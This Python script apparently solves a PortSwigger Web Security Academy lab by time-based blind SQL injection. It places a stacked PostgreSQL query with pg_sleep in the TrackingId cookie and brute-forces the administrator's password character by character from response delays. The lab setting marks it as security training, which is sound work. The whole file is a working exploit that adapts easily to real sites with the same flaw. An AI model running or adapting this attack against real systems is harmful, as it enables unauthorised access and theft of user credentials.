#!/usr/bin/env python3

import string
import requests
import signal
import pwn
import sys
import time

# Ctrl_C

def def_handler(sig, frame):
    print("\n[X] Cancelling brute force attack...\n ")
    p1.failure("Attack stopped")
    sys.exit(1)
    

def bruteforceSQLI():

    url="https://0a59007c03b982a68105344400520044.web-security-academy.net/"
    password = ""

    characters = string.ascii_lowercase + string.digits

    for position in range(1,21):
        for char in characters:

            cookies = {"TrackingId":f"'%3b select case when(username='administrator' and substring(password,{position},1)='{char}') then pg_sleep(2) else pg_sleep(0) end from users-- -",
                       "session":"iagESIZChhUmrwJaDh6JKnLm69Jx0W7w"
                       }
            
            p1.status(cookies["TrackingId"])

            start_time = time.time()

            r = requests.get(url, cookies=cookies)

            end_time = time.time()

            if end_time - start_time > 2:
                password += char
                p2.status(password)
                break



if __name__ == "__main__":
    
    signal.signal(signal.SIGINT, def_handler)

    p1 = pwn.log.progress("Time Based SQLI")
    p2 = pwn.log.progress("Password")

    bruteforceSQLI()



    p1.success("Attack finished.")

